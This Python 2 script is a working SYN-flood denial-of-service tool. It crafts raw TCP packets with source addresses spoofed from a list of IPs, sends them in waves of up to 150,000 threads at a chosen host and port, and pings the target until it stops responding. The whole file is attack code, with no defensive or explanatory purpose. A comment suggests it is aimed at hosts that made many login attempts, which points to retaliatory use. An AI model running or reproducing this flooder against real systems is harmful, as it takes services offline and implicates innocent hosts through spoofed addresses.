from struct import *
import threading
import socket
import random
import utils
import time
import sys
import os

tic = time.time()


def checksum(msg):                                  # calculates checksum of message
    s = 0
    for i in range(0, len(msg), 2):                 # loop taking 2 characters at a time
        w = (ord(msg[i]) << 8) + (ord(msg[i + 1]))
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff                                 # complement and mask to 4 byte short
    return s


def create_raw_socket():
    # create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # tell kernel not to put in headers, since we are providing it
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    return s


def create_and_send_syn(source_ip, dest_ip, dport):
    s = create_raw_socket()
    # start constructing the packet
    ihl = 5            # ip header fields
    version = 4
    tos = 0
    tot_len = 20 + 20  # python fills the total length
    id = random.randint(1,5500)  # Id of this packet
    frag_off = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    check = 10  # python seems to correctly fill the checksum
    saddr = socket.inet_aton(source_ip)  # Spoof the source ip address if you want to
    daddr = socket.inet_aton(dest_ip)
    ihl_version = (version << 4) + ihl

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol,
                     check, saddr, daddr)

    source = id   # source port
    dest = dport  # destination port
    seq = 0
    ack_seq = 0
    doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
    # tcp flags - syn is set
    fin = 0; syn = 1; rst = 0
    psh = 0; ack = 0; urg = 0
    window = socket.htons(5840)  # maximum allowed window size
    check = 0
    urg_ptr = 0

    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

    # pack format string in network order
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window,
                      check, urg_ptr)

    # pseudo header fields
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    tcp_checksum = checksum(psh)

    # make the tcp header again and fill the correct checksum
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,
                      window, tcp_checksum, urg_ptr)

    # final full packet - syn packets dont have any data
    packet = ip_header + tcp_header #+ 'A'*1000
    s.sendto(packet, (dest_ip, 0))
    # s.close()
    return s


def pull_shitlist_data():
    target_pool = []
    for ln in utils.swap('unique.txt', False):
        target_pool.append(ln.split('\t')[0])
    return target_pool


def flood(port, TARGET_HOST, N_THREADS):
    alive = True
    spoof_pool = pull_shitlist_data()
    waves = 0
    while alive:
        attack = {}
        print 'STARTING \033[1m\033[31m%d\033[0m SIMULTANEOUS SYN-Packets @ %s' % (N_THREADS, TARGET_HOST)
        for ii in range(N_THREADS):
            try:  # get a random IP address
                src = spoof_pool.pop()
            except IndexError:
                spoof_pool = pull_shitlist_data()
                src = spoof_pool.pop()
                pass
            attack[ii] = threading.Thread(target=create_and_send_syn, args=(src, TARGET_HOST, port))
        for jj in range(N_THREADS):
            attack[jj].start()
        for kk in range(N_THREADS):
            attack[kk].join()
        print 'Attack Wave %d Finished [%ss Elapsed]' % (waves, str(time.time() - tic))
        waves += 1

        # Ping the target (or try to) and see if they're still there
        os.system('ping -c 1 %s >> ruthere.txt' % TARGET_HOST)
        for line in utils.swap('ruthere.txt', True):
            try:
                ttl = line.split('64 bytes from ')[1]
            except IndexError:
                pass
        try:
            if ttl:
                print '%s is still Alive:' % TARGET_HOST
                print ttl
        except NameError:
            print '[*] Remote Host DOWN'
            alive = False
    return alive, waves


if __name__ == '__main__':
    target = '10.0.0.1'  # Someone on the shit_list with over 100+ attempts to login
    n_threads = 150000
    dport = 80

    if 'target' and len(sys.argv) >= 3:
        target = sys.argv[2]
    if '-p' in sys.argv:
        dport = int(sys.argv[4])

    try:
        killed, n_waves = flood(dport, target, n_threads)
    except KeyboardInterrupt:
        print '[!!] Attack Killed after %d waves [%ss Elapsed]' % \
              (n_waves, str(time.time() - tic))

